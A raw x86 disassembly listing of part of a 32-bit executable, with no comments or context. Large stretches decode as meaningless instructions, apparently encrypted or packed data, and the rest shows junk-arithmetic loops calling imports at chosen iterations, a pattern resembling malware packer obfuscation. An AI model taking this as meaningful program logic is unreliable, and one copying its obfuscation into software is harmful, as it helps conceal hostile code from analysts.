  403094:	lods   eax,DWORD PTR ds:[esi]
  403095:	mov    ds:0x52406864,al
  40309a:	and    eax,0x36405338
  40309f:	mov    edi,0x1ad2672f
  4030a4:	repz adc DWORD PTR [edx+0x37ab291d],0xc0ade97a
  4030af:	dec    esp
  4030b0:	xor    ebx,ebx
  4030b2:	je     0x40310f
  4030b4:	push   esi
  4030b5:	xor    eax,0x3f6fa81a
  4030ba:	std    
  4030bb:	test   eax,0xcdce2c5f
  4030c0:	pop    ecx
  4030c1:	sbb    DWORD PTR [edi],esi
  4030c3:	enter  0x6d51,0xf1
  4030c7:	scas   al,BYTE PTR es:[edi]
  4030c8:	jno    0x403087
  4030ca:	pop    esp
  4030cb:	inc    edx
  4030cc:	repz enter 0xf2be,0xb2
  4030d1:	inc    ebx
  4030d2:	jo     0x40312b
  4030d4:	add    DWORD PTR [ebx-0x1],esp
  4030d7:	or     edx,DWORD PTR ss:[eax+esi*8]
  4030db:	sbb    BYTE PTR [esi],al
  4030dd:	jb     0x4030f9
  4030df:	fistp  QWORD PTR [edx+0x5e5bfbe1]
  4030e5:	add    DWORD PTR [ebp+eax*4-0x26],edi
  4030e9:	sub    eax,0x42afea8a
  4030ee:	push   0xe185b68f
  4030f3:	stc    
  4030f4:	sub    DWORD PTR [ebp-0x59053330],eax
  4030fa:	imul   esp,DWORD PTR [ebp-0x6a],0x3e
  4030fe:	jmp    0x4030a1
  403100:	mov    esi,0xbd42b8c7
  403105:	inc    esp
  403106:	push   edi
  403107:	and    DWORD PTR [ecx+edi*8-0x7c78f5d9],ecx
  40310e:	or     DWORD PTR [ebx+0x15],ebp
  403111:	sub    al,0x5e
  403113:	mov    ch,0x35
  403115:	push   esp
  403116:	int3   
  403117:	ins    DWORD PTR es:[edi],dx
  403118:	xchg   ebp,eax
  403119:	add    bl,BYTE PTR [esi-0x6b]
  40311c:	fdiv   st,st(1)
  40311e:	xchg   esp,eax
  40311f:	push   esp
  403120:	xor    al,0x80
  403122:	mov    ds:0x914952c6,al
  403127:	out    dx,al
  403128:	pop    edx
  403129:	hlt    
  40312a:	and    ecx,DWORD PTR [eax+0x49c3ed1a]
  403130:	cs xchg esi,eax
  403132:	xor    DWORD PTR [ecx],esi
  403134:	bound  ebx,QWORD PTR [edx+0x663f4401]
  40313a:	aam    0xc
  40313c:	call   DWORD PTR [eax-0x2]
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx+0x17abc15c],0x5c
  40315f:	jb     0x40311b
  403161:	pop    ss
  403162:	jle    0x4031e2
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x4031c6
  403169:	push   esp
  40316a:	sub    DWORD PTR [ecx+esi*1-0x13],ebx
  40316e:	clc    
  40316f:	fcom   QWORD PTR [esi+0x431e1aab]
  403175:	and    eax,0xfb299787
  40317a:	pop    edi
  40317b:	out    dx,eax
  40317c:	ja     0x4031d5
  40317e:	scas   eax,DWORD PTR es:[edi]
  40317f:	stc    
  403180:	sbb    al,0x7e
  403182:	out    0xb6,eax
  403184:	ror    al,cl
  403186:	sbb    dl,BYTE PTR cs:[ecx]
  403189:	into   
  40318a:	mov    DWORD PTR [esi-0x16f753c0],0x8a7ca9ca
  403194:	xor    eax,0xd2d2f0b4
  403199:	es push ds
  40319b:	xchg   edi,eax
  40319c:	lods   eax,DWORD PTR ds:[esi]
  40319d:	clc    
  40319e:	aas    
  40319f:	mov    esi,0x700e3653
  4031a4:	sbb    BYTE PTR [ebx],dh
  4031a6:	mov    ch,0xaa
  4031a8:	jnp    0x403188
  4031aa:	ds loopne 0x403190
  4031ad:	mov    ch,0xb7
  4031af:	and    cl,BYTE PTR [edi+0x45]
  4031b2:	repnz cli 
  4031b4:	jnp    0x40313b
  4031b6:	das    
  4031b7:	xor    ecx,ecx
  4031b9:	scas   eax,DWORD PTR es:[edi]
  4031ba:	lock enter 0x5e69,0x1
  4031bf:	push   es
  4031c0:	push   ecx
  4031c1:	jmp    0x403155
  4031c3:	jmp    FWORD PTR [esi+ebp*1+0x28a03e30]
  4031ca:	dec    ebp
  4031cb:	cdq    
  4031cc:	mov    DWORD PTR [ecx+0x38e15811],esi
  4031d2:	mov    al,BYTE PTR [ecx]
  4031d4:	add    eax,0x752493a4
  4031d9:	lods   eax,DWORD PTR ds:[esi]
  4031da:	rcr    BYTE PTR [eax-0x50023d2c],1
  4031e0:	repnz (bad) 
  4031e2:	jmp    0x40316e
  4031e4:	(bad)  
  4031e7:	xor    ecx,DWORD PTR ss:[edx+0x6d]
  4031eb:	imul   edx,DWORD PTR [ecx-0x63c1c2c0],0x51
  4031f2:	mov    bh,0x82
  4031f4:	dec    esp
  4031f5:	inc    edi
  4031f6:	add    al,0xc9
  4031f8:	mov    edx,0xd71fef47
  4031fd:	xor    BYTE PTR [ebx-0x65678893],bl
  403203:	jns    0x40318b
  403205:	sbb    eax,0x5b49b0c9
  40320a:	add    eax,0x9c88493a
  40320f:	inc    edi
  403210:	xchg   ebx,eax
  403211:	shl    edx,cl
  403213:	xchg   ebp,eax
  403214:	push   ebp
  403215:	imul   ecx,DWORD PTR [ebp-0x34b98400],0x36
  40321c:	jns    0x403229
  40321e:	aad    0x6e
  403220:	ds addr16 ss pop eax
  403224:	add    eax,0x46cb3be7
  403229:	(bad)
  40322d:	inc    esi
  40322e:	ja     0x40324b
  403230:	push   edx
  403231:	popa   
  403232:	push   eax
  403233:	xchg   esp,eax
  403234:	sbb    ebx,DWORD PTR [ebx]
  403236:	xchg   ecx,eax
  403237:	in     al,dx
  403238:	add    al,0x97
  40323a:	test   BYTE PTR [ebp-0x12],bh
  40323d:	or     esp,DWORD PTR [ecx+0x58e8b534]
  403243:	rol    BYTE PTR [ebp+ebp*2-0x917d330],1
  40324a:	cld    
  40324b:	add    al,0xa7
  40324d:	imul   esi,DWORD PTR [ebp-0x63534ae5],0x56ecc54d
  403257:	pop    ebx
  403258:	adc    bh,BYTE PTR [edi]
  40325a:	das    
  40325b:	mov    cl,0xe
  40325d:	or     ebp,DWORD PTR [edx+0x7d]
  403260:	int3   
  403261:	(bad)  
  403262:	sar    DWORD PTR ds:0xdd02dd3c,cl
  403268:	mov    BYTE PTR [ebx+0x7524ea94],dl
  40326e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40326f:	scas   eax,DWORD PTR es:[edi]
  403270:	push   ebx
  403271:	rcl    DWORD PTR [eax],0x5b
  403274:	stos   DWORD PTR es:[edi],eax
  403275:	push   es
  403276:	pop    edx
  403277:	jp     0x4032d5
  403279:	jne    0x403207
  40327b:	lods   al,BYTE PTR ds:[esi]
  40327c:	sar    dh,1
  40327e:	inc    ecx
  40327f:	push   eax
  403280:	fld    st(7)
  403282:	jbe    0x403256
  403284:	hlt    
  403285:	arpl   dx,si
  403287:	adc    edx,DWORD PTR [ecx+0x1922efaa]
  40328d:	scas   eax,DWORD PTR es:[edi]
  40328e:	mov    DWORD PTR [edi],0x794dbea2
  403294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403295:	inc    esp
  403296:	scas   eax,DWORD PTR es:[edi]
  403297:	stos   DWORD PTR es:[edi],eax
  403298:	sub    al,0x28
  40329a:	loope  0x403248
  40329c:	(bad)  
  40329d:	pushf  
  40329e:	xchg   BYTE PTR [eax],bh
  4032a0:	icebp  
  4032a1:	test   edx,edx
  4032a3:	loopne 0x403254
  4032a5:	jae    0x4032c7
  4032a7:	jae    0x4032e8
  4032a9:	shl    DWORD PTR [eax+0x66],0xfd
  4032ad:	or     eax,0x5d7e859
  4032b2:	or     al,ah
  4032b4:	test   eax,0xe2460df0
  4032b9:	push   ecx
  4032ba:	mov    bl,0xc8
  4032bc:	mov    ds:0x60710ecc,al
  4032c1:	js     0x4032f7
  4032c3:	or     DWORD PTR [edi+0x613c044c],esp
  4032c9:	dec    esi
  4032ca:	imul   ecx,edi,0xca191f2a
  4032d0:	or     ebx,DWORD PTR [ecx+edx*2+0x19c45e0]
  4032d7:	adc    al,bl
  4032d9:	xor    eax,0x3e3c1db6
  4032de:	fadd   st,st(3)
  4032e0:	pop    ds
  4032e1:	call   0x3638260a
  4032e6:	(bad)  
  4032e7:	dec    esi
  4032e8:	mov    ebx,0x5ef8fcee
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43365b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43365b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43365b,ecx
  40331d:	cmp    DWORD PTR ds:0x43365b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43365b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4336ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4336d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43361f
  40336b:	add    DWORD PTR ds:0x433603,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433657,0x1e
  40338b:	cmp    DWORD PTR ds:0x433657,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433657,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433657,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433657
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433657,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433657
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433657,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4336e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433647
  4033f2:	mov    edi,DWORD PTR ds:0x433687
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433667,0x1c
  40340f:	cmp    DWORD PTR ds:0x433667,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433667,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433667,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433667
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433667,edi
  40344c:	mov    edi,DWORD PTR ds:0x433667
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433667,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4336e3
  403467:	and    edx,DWORD PTR ds:0x433717
  40346d:	mov    DWORD PTR ds:0x4336e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43369b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43371f
  40349f:	adc    DWORD PTR ds:0x4335ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433717,0x10
  4034c6:	cmp    DWORD PTR ds:0x433717,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433717,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433717,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433717
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433717,edi
  403505:	mov    edi,DWORD PTR ds:0x433717
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433717,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43372b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp-0x56bc2b76]
  403537:	das    
  403538:	inc    esp
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	imul   ebp,DWORD PTR [edi],0xf8fb2896
  403547:	popa   
  403548:	mov    edi,0xee10b93d
  40354d:	cmc    
  40354e:	and    eax,0x69369e98
  403553:	inc    DWORD PTR [esi]
  403555:	mov    cl,0xec
  403557:	ja     0x4034ed
  403559:	add    al,0xbd
  40355b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40355c:	ds mov ecx,0x91407d56
  403562:	popa   
  403563:	adc    al,0x4f
  403565:	sti    
  403566:	inc    ebx
  403567:	sub    al,cl
  403569:	inc    esp
  40356a:	xchg   esi,eax
  40356b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40356c:	inc    ecx
  40356d:	test   eax,ecx
  40356f:	icebp  
  403570:	jb     0x403518
  403572:	push   edi
  403573:	out    0x44,eax
  403575:	pop    edi
  403576:	aas    
  403577:	frstor [ebx]
  403579:	inc    edx
  40357a:	mov    ds:0xefd06799,al
  40357f:	mov    edx,0x8a298e83
  403584:	mov    edi,0xb8552d0a
  403589:	inc    esi
  40358a:	cmp    eax,0x38fb71b7
  40358f:	and    dh,0xb8
  403592:	in     eax,dx
  403593:	(bad)  [esi+0x19f06ce9]
  403599:	lods   al,BYTE PTR ds:[esi]
  40359a:	dec    ebp
  40359b:	je     0x403574
  40359d:	inc    edx
  40359e:	mov    DWORD PTR [edx+ebx*1-0x7a],edx
  4035a2:	imul   DWORD PTR [ecx-0x63]
  4035a5:	add    al,0xb5
  4035a7:	scas   al,BYTE PTR es:[edi]
  4035a8:	scas   eax,DWORD PTR es:[edi]
  4035a9:	mov    esi,0xcdfba2cd
  4035ae:	xchg   edx,eax
  4035af:	call   0x5333:0x3b56f30f
  4035b6:	add    ebp,DWORD PTR [esi+0x12361603]
  4035bc:	retf   0xc755
  4035bf:	push   ds
  4035c0:	int3   
  4035c1:	mov    edi,0x9607486f
  4035c6:	xor    eax,DWORD PTR [eax+0x5ecadff8]
  4035cc:	jnp    0x4035e4
  4035ce:	mov    al,bh
  4035d0:	jne    0x4035bf
  4035d2:	sbb    BYTE PTR [esi],al
  4035d4:	push   esp
  4035d5:	icebp  
  4035d6:	jge    0x403587
  4035d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035d9:	bound  ebp,QWORD PTR [ebx+0x36]
  4035dc:	adc    al,0xf4
  4035de:	pop    esi
  4035df:	cwde   
  4035e0:	test   eax,0xf3970010
  4035e5:	add    eax,DWORD PTR [ebx-0x699f1728]
  4035eb:	xchg   edx,eax
  4035ec:	dec    eax
  4035ed:	xor    ebp,eax
  4035ef:	xchg   ebx,eax
  4035f0:	cmp    BYTE PTR [ecx],bh
  4035f2:	cli    
  4035f3:	dec    edx
  4035f4:	ror    BYTE PTR [edx-0x383a1b3d],0x6b
  4035fb:	inc    esi
  4035fc:	sar    DWORD PTR [esi-0x48],0xbd
  403600:	cli    
  403601:	or     esi,DWORD PTR [ebx]
  403603:	clc    
  403604:	mov    ecx,0x93a01e0c
  403609:	bound  edi,QWORD PTR [edi]
  40360b:	push   ebp
  40360c:	mov    bh,0x27
  40360e:	repz fld DWORD PTR [ebp+0x46]
  403612:	call   FWORD PTR [eax+ebp*8-0x440be06b]
  403619:	je     0x4035a8
  40361b:	pop    ss
  40361c:	jne    0x40362d
  40361e:	test   eax,0xc022c828
  403623:	mov    edx,0x3e912eda
  403628:	iret   
  403629:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40362b:	ret    0xffb7
  40362e:	aam    0xcd
  403630:	shr    BYTE PTR [edx],1
  403632:	jnp    0x4035d9
  403634:	dec    ecx
  403635:	mov    ebp,0xba601d65
  40363a:	in     eax,0x1
  40363c:	add    DWORD PTR [edi],ecx
  40363e:	into   
  40363f:	inc    edi
  403640:	mov    ecx,eax
  403642:	pop    eax
  403643:	pusha  
  403644:	je     0x4035d6
  403646:	rcr    DWORD PTR [ecx],cl
  403648:	add    eax,0x59771009
  40364d:	and    DWORD PTR [eax-0x6],esi
  403650:	inc    edi
  403651:	add    eax,0xa6845753
  403656:	clc    
  403657:	fwait
  403658:	mov    edi,0xefb16ec1
  40365d:	push   cs
  40365e:	and    eax,0x7d83f495
  403663:	cld    
  403664:	loope  0x4035ed
  403666:	xor    dh,BYTE PTR [ecx+0x2a7f8ad4]
  40366c:	pop    edi
  40366d:	jle    0x4036af
  40366f:	dec    ebx
  403670:	shl    BYTE PTR [esi+0x4a],0xcf
  403674:	or     eax,0xb1fcc7c1
  403679:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40367b:	pop    es
  40367c:	or     dl,BYTE PTR [ebp+ebx*8-0x15]
  403680:	xor    DWORD PTR [edx],0x6d
  403683:	jae    0x403655
  403685:	rcl    BYTE PTR [esi],0x32
  403688:	inc    edi
  403689:	jg     0x40368f
  40368b:	push   0xe
  40368d:	pop    esp
  40368e:	xchg   esi,eax
  40368f:	jo     0x403611
  403691:	or     ebp,DWORD PTR [esp+ebp*4+0x3f]
  403695:	xor    BYTE PTR [eax-0x3d8ba622],dh
  40369b:	mov    ch,0xd
  40369d:	outs   dx,BYTE PTR ds:[esi]
  40369e:	repnz mov dl,0x53
  4036a1:	lock into 
  4036a3:	lods   eax,DWORD PTR ds:[esi]
  4036a4:	test   BYTE PTR [esi+0xd61cdfe],0xd
  4036ab:	xor    DWORD PTR [edx-0x23],ecx
  4036ae:	pop    ds
  4036af:	sbb    ch,BYTE PTR [edx]
  4036b1:	mov    al,0x1c
  4036b3:	inc    edi
  4036b4:	add    BYTE PTR [edx+eiz*2+0x3b],0x22
  4036b9:	cmp    BYTE PTR [ebp-0x6540d1d],cl
  4036bf:	push   ebx
  4036c0:	leave  
  4036c1:	cdq    
  4036c2:	push   0x66655c99
  4036c7:	aaa    
  4036c8:	scas   eax,DWORD PTR es:[edi]
  4036c9:	punpckhbw mm2,QWORD PTR [edx+ecx*4]
  4036cd:	int    0xdf
  4036cf:	push   0x7a
  4036d1:	sub    DWORD PTR [edi+edx*4+0x516cbf19],0x64
  4036d9:	ins    DWORD PTR es:[edi],dx
  4036da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036db:	jmp    0x2c0d:0x4a7e1137
  4036e2:	pop    esi
  4036e3:	push   ss
  4036e4:	jo     0x4036e6
  4036e6:	pop    esp
  4036e7:	mov    ebp,0xf159a88c
  4036ed:	retf   
  4036ee:	les    esi,FWORD PTR [ecx-0x60]
  4036f1:	push   ss
  4036f2:	imul   ebp,DWORD PTR [edi],0xf82b8279
  4036f8:	adc    dh,bl
  4036fa:	cli    
  4036fb:	jg     0x403723
  4036fd:	(bad)  
  4036fe:	dec    ebp
  4036ff:	aas    
  403700:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  403702:	jns    0x40370e
  403704:	lock hlt 
  403706:	add    eax,0xff91355a
  40370b:	outs   dx,BYTE PTR es:[esi]
  40370d:	push   ecx
  40370e:	stos   DWORD PTR es:[edi],eax
  40370f:	jo     0x403725
  403711:	(bad)  
  403712:	fst    st(7)
  403714:	aaa    
  403715:	es jle 0x403720
  403718:	jns    0x403757
  40371a:	sti    
  40371b:	ret    
  40371c:	test   edx,0xcbeee6b1
  403722:	repz xchg cl,ch
  403725:	cmc    
  403726:	add    al,0x74
  403728:	and    DWORD PTR [ebx-0x76],esp
  40372b:	in     eax,0x46
  40372d:	jg     0x403794
  40372f:	jns    0x403719
  403731:	fistp  DWORD PTR [bp+di]
  403734:	pop    eax
  403735:	rcr    DWORD PTR [eax+0x1a],cl
  403738:	sbb    DWORD PTR [ebp+0x5],edx
  40373b:	xchg   ebx,eax
  40373c:	ja     0x40376e
  40373e:	lods   al,BYTE PTR ds:[esi]
  40373f:	or     DWORD PTR [ebx+0x19],eax
  403742:	pop    edi
  403743:	add    ebp,esp
  403745:	mov    ss,WORD PTR [ebx-0x1bd19a0e]
  40374b:	stos   DWORD PTR es:[edi],eax
  40374c:	pop    ebp
  40374d:	mov    ss,WORD PTR [ebx+esi*4]
  403750:	xchg   edx,eax
  403751:	inc    eax
  403752:	xchg   DWORD PTR [ebx+0x7ceb8560],esp
  403758:	mul    BYTE PTR [ecx+0xf354b28]
  40375e:	jb     0x40371d
  403760:	in     eax,0xb6
  403762:	push   ecx
  403763:	xlat   BYTE PTR ds:[ebx]
  403764:	mov    cl,0xbc
  403766:	mov    es,WORD PTR [ecx]
  403768:	xchg   BYTE PTR [edi],bl
  40376a:	cwde   
  40376b:	push   esi
  40376c:	mov    DWORD PTR [eax+0x3bd13902],ebx
  403772:	jns    0x4037bc
  403774:	std    
  403775:	sbb    al,0x5a
  403777:	xchg   esp,eax
  403778:	out    dx,eax
  403779:	in     eax,0xbf
  40377b:	mov    eax,ds:0xe4ffaa8e
  403780:	push   0xffffffb4
  403782:	adc    DWORD PTR [ecx],esi
  403784:	data16 xor BYTE PTR [edi+0x67],bl
  403788:	lea    esp,ss:[ebx+0x36]
  40378c:	inc    ecx
  40378d:	cdq    
  40378e:	mov    al,ds:0x931b2f77
  403793:	repnz ds inc edi
  403796:	cmp    DWORD PTR [ecx+0x2c],edx
  403799:	sbb    eax,0xcb996712
  40379e:	mov    ecx,0x6a427d34
  4037a3:	not    DWORD PTR [esi+0x26]
  4037a6:	aaa    
  4037a7:	jb     0x4037ac
  4037a9:	push   cs
  4037aa:	outs   dx,BYTE PTR ds:[esi]
  4037ab:	sbb    bh,BYTE PTR [eax-0x6bd9dd59]
  4037b1:	mov    ebp,es
  4037b3:	jg     0x4037ae
  4037b5:	clc    
  4037b6:	cmp    al,0x85
  4037b8:	test   BYTE PTR [ecx],ah
  4037ba:	push   edi
  4037bb:	out    0xf5,al
  4037bd:	fnstsw WORD PTR [eax+0xf]
  4037c0:	stc    
  4037c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037c2:	aas    
  4037c3:	mov    ds:0x3ae3a60f,eax
  4037c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037c9:	aas    
  4037ca:	mov    ch,0xc
  4037cc:	cwde   
  4037cd:	out    0xb,eax
  4037cf:	push   edi
  4037d0:	xchg   ecx,eax
  4037d1:	ja     0x40380f
  4037d3:	mov    eax,esp
  4037d5:	inc    esi
  4037d6:	xchg   ebx,eax
  4037d7:	retf   
  4037d8:	inc    ebp
  4037d9:	rol    DWORD PTR [eax],0xfc
  4037dc:	sub    eax,0x7fe5561
  4037e1:	mov    bl,0xfc
  4037e3:	iret   
  4037e4:	daa    
  4037e5:	(bad)
  4037e8:	addr16 mov bh,0x81
  4037eb:	xchg   ebx,eax
  4037ec:	gs imul esi,eax,0x45
  4037f0:	adc    edx,DWORD PTR [ebx-0x51]
  4037f3:	xor    dl,BYTE PTR [edx+ebp*8-0x2f]
  4037f7:	rcr    DWORD PTR [eiz*1+0x45442b3],1
  4037fe:	shl    edi,cl
  403800:	xchg   edi,eax
  403801:	imul   ecx,esp,0x35690aec
  403807:	or     bh,bh
  403809:	stc    
  40380a:	inc    ebx
  40380b:	fisub  DWORD PTR [ecx-0x8]
  40380e:	pop    esi
  40380f:	mov    WORD PTR [esi],es
  403811:	sub    eax,ebx
  403813:	lods   eax,DWORD PTR ds:[esi]
  403814:	and    DWORD PTR [ebx+0x7b74faf],ebx
  40381a:	jg     0x403855
  40381c:	adc    al,0x15
  40381e:	dec    ebp
  40381f:	adc    BYTE PTR [edx],bl
  403821:	push   ss
  403822:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403824:	mov    ebx,DWORD PTR [ebx-0x3bba3899]
  40382a:	cmp    BYTE PTR [ebp+0x3d1bf89c],al
  403830:	sti    
  403831:	xor    eax,0x558b0043
  403836:	or     BYTE PTR [ebx],bl
  403838:	cmp    eax,0x4336ab
  40383d:	xor    edx,eax
  40383f:	and    DWORD PTR ds:0x433727,0x0
  403849:	xor    edi,edi
  40384b:	add    edi,DWORD PTR ds:0x433727
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433727,edi
  403858:	cmp    DWORD PTR ds:0x433727,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433727,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433727
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433727,edi
  40389c:	cmp    DWORD PTR ds:0x433727,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43366b,0x43372b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433693,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4336eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433727,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4336eb,0x4336ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4335fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433617,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433613,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43371b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4335ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4335ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4335ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4335ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4335ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4335ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4335ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4335ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433667
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433613
  4039a6:	sub    edi,DWORD PTR ds:0x433723
  4039ac:	mov    DWORD PTR ds:0x433613,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433607,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433607,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433607,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433607
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433607,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433617
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4335fb,0x0
  403a0a:	xor    ebx,ebx
